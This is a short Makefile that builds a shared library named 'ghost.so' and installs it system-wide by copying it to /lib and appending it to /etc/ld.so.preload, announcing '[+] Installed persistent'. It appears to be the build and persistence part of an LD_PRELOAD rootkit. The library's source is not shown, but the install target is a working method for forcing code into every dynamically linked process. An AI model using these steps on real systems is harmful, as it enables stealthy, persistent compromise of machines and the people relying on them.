all:
        gcc -shared -fPIC -O2 -o ghost.so ghost_preload.c -ldl
        @echo "[+] ghost.so built"

install:
        cp ghost.so /lib/ghost.so
        grep -q ghost.so /etc/ld.so.preload 2>/dev/null || \
          echo "/lib/ghost.so" >> /etc/ld.so.preload
        @echo "[+] Installed persistent"

uninstall:
        sed -i '/ghost\.so/d' /etc/ld.so.preload
        rm -f /lib/ghost.so

clean:
        rm -f ghost.so
